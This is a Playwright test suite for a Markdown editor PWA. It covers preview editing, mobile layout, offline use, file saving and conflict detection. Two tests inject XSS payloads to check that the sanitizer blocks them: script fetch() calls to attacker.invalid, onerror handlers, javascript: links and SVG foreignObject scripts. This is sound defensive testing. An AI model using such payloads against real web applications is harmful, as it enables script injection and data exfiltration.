import { test, expect } from '@playwright/test';

test('PWA Markdown Source and safe Preview local patch', async ({ page }) => {
  await page.goto('/markdown');
  const source = page.getByRole('textbox', { name: 'Source — Markdown canônico' });
  await source.fill('# Teste\n\nTexto simples');
  const preview = page.frameLocator('iframe[title="Pré-visualização Markdown isolada"]');
  await expect(preview.locator('h1')).toContainText('Teste');
  await preview.locator('.md-correctable').filter({ hasText: 'Texto simples' }).click();
  await preview.getByRole('textbox', { name: 'Corrigir texto no Preview' }).fill('Texto alterado');
  await preview.getByRole('button', { name: 'Aplicar correção' }).click();
  await expect(source).toHaveValue('# Teste\n\nTexto alterado');
  await expect(page.getByRole('status').first()).toContainText('não salva');
});

test('320px layout retains Source and Preview with tabs', async ({ page }) => {
  await page.setViewportSize({ width: 320, height: 680 });
  await page.goto('/markdown');
  const source = page.locator('#markdown-source');
  await source.fill('## Mobile\n\nTexto');
  await page.getByRole('button', { name: 'Preview', exact: true }).click();
  await expect(page.frameLocator('iframe[title="Pré-visualização Markdown isolada"]').locator('h2')).toHaveText('Mobile');
  await page.getByRole('button', { name: 'Source', exact: true }).click();
  await expect(source).toHaveValue('## Mobile\n\nTexto');
});

test('malicious Markdown does not trigger network egress', async ({ page }) => {
  const requests: string[] = [];
  page.on('request', req => { if (/attacker\.invalid/.test(req.url())) requests.push(req.url()); });
  await page.goto('/markdown');
  await page.locator('#markdown-source').fill('![x](https://attacker.invalid/track)\n\n<script>fetch("https://attacker.invalid/ping")</script>');
  await expect(page.frameLocator('iframe[title="Pré-visualização Markdown isolada"]').locator('.md-blocked-image')).toBeVisible();
  await page.waitForTimeout(100);
  expect(requests).toEqual([]);
});

test('fallback download is not marked as saved', async ({ page }) => {
  await page.goto('/markdown');
  await page.locator('#markdown-source').fill('# Rascunho\n');
  const [download] = await Promise.all([
    page.waitForEvent('download'),
    page.getByRole('button', { name: 'Salvar', exact: true }).click()
  ]);
  expect(download.suggestedFilename()).toBe('sem-titulo.md');
  await expect(page.getByRole('status').first()).toContainText('Download solicitado');
  await expect(page.locator('.md-filename')).toContainText('não salvo');
});

test('installed Markdown PWA can edit while offline', async ({ page, context, browserName }) => {
  test.skip(browserName !== 'chromium', 'Baseline PWA offline Chromium; other engines require separate feature matrix.');
  await page.goto('/markdown');
  await page.evaluate(async () => {
    if (!('serviceWorker' in navigator)) throw new Error('Service worker unavailable');
    await navigator.serviceWorker.ready;
  });
  await context.setOffline(true);
  await page.reload();
  await expect(page.locator('#markdown-source')).toBeVisible();
  await page.locator('#markdown-source').fill('# Offline\n');
  await expect(page.frameLocator('iframe[title="Pré-visualização Markdown isolada"]').locator('h1')).toHaveText('Offline');
});

test('Mermaid renders as an isolated local SVG data image', async ({ page }) => {
  await page.goto('/markdown');
  const fence = String.fromCharCode(96).repeat(3);
  await page.locator('#markdown-source').fill(fence + 'mermaid\ngraph TD\n  A-->B\n' + fence);
  const preview = page.frameLocator('iframe[title="Pré-visualização Markdown isolada"]');
  const image = preview.locator('img.md-mermaid-image');
  await expect(image).toBeVisible({ timeout: 30_000 });
  const src = await image.getAttribute('src');
  expect(src).toMatch(/^data:image\/svg\+xml/);
});

test('Markdown route does not fetch Universal Reader document modules', async ({ page }) => {
  const scriptRequests: string[] = [];
  page.on('request', req => {
    if (req.resourceType() === 'script') scriptRequests.push(req.url());
  });
  await page.goto('/markdown');
  await expect(page.locator('#markdown-source')).toBeVisible();
  expect(scriptRequests.some(url => /\/assets\/App-[^/]+\.js/.test(url))).toBe(false);
});


test('browser file-picker adapter saves only after confirmed write and detects external edits', async ({ page }) => {
  await page.addInitScript(() => {
    const state = { content: '# Original', deny: false, writes: 0 };
    const handle = {
      name: 'opened.md',
      getFile: async () => new File([state.content], 'opened.md', { type: 'text/markdown' }),
      createWritable: async () => ({
        write: async (bytes: Uint8Array) => {
          if (state.deny) throw new Error('permission denied');
          state.content = new TextDecoder().decode(bytes);
          state.writes++;
        },
        close: async () => {},
        abort: async () => {}
      })
    };
    Object.assign(window, { __markdownMock: state, showOpenFilePicker: async () => [handle] });
  });
  await page.goto('/markdown');
  await page.getByRole('button', { name: 'Abrir', exact: true }).click();
  await expect(page.locator('#markdown-source')).toHaveValue('# Original');
  await page.locator('#markdown-source').fill('# Nova versão');
  await page.getByRole('button', { name: 'Salvar', exact: true }).click();
  await expect(page.getByRole('status').first()).toContainText('Salvo: gravação local confirmada.');
  const firstWrite = await page.evaluate(() => (window as unknown as {
    __markdownMock: { content: string; writes: number }
  }).__markdownMock);
  expect(firstWrite.content).toBe('# Nova versão');
  expect(firstWrite.writes).toBe(1);

  // A browser picker handle can return changed bytes after a file is opened.
  await page.evaluate(() => {
    (window as unknown as { __markdownMock: { content: string } }).__markdownMock.content = '# Externo';
  });
  await page.locator('#markdown-source').fill('# Nova versão local');
  await page.getByRole('button', { name: 'Salvar', exact: true }).click();
  await expect(page.getByRole('status').first()).toContainText('Conflito');
  await expect(page.locator('.md-filename')).toContainText('não salvo');
  const afterConflict = await page.evaluate(() => (window as unknown as {
    __markdownMock: { content: string; writes: number }
  }).__markdownMock);
  expect(afterConflict.content).toBe('# Externo');
  expect(afterConflict.writes).toBe(1);
});

test('invalid UTF-8 import is rejected without replacing current Source', async ({ page }) => {
  await page.goto('/markdown');
  await page.locator('#markdown-source').fill('# Keep');
  page.once('dialog', dialog => void dialog.accept());
  await page.locator('input[type="file"]').setInputFiles({
    name: 'invalid.md', mimeType: 'text/markdown', buffer: Buffer.from([0xC3, 0x28])
  });
  await expect(page.locator('#markdown-source')).toHaveValue('# Keep');
  await expect(page.getByRole('status').first()).toContainText('encoded data');
});

test('untrusted Markdown cannot execute HTML, URL, SVG or initiate outbound resource requests', async ({ page }) => {
  const outbound: string[] = [];
  page.on('request', req => { if (req.url().includes('attacker.invalid')) outbound.push(req.url()); });
  await page.goto('/markdown');
  await page.locator('#markdown-source').fill(
    '<img src="https://attacker.invalid/a" onerror="alert(1)">\n\n' +
    '[click here](javascript:alert(1))\n\n![remote](https://attacker.invalid/img)\n\n' +
    '<svg><foreignObject><script>fetch("https://attacker.invalid/x")</script></foreignObject></svg>'
  );
  const preview = page.frameLocator('iframe[title="Pré-visualização Markdown isolada"]');
  await expect(preview.locator('.md-blocked-image')).toBeVisible();
  expect(await preview.locator('img,script,svg,iframe,object').count()).toBeLessThanOrEqual(1);
  await page.waitForTimeout(100);
  expect(outbound).toEqual([]);
});
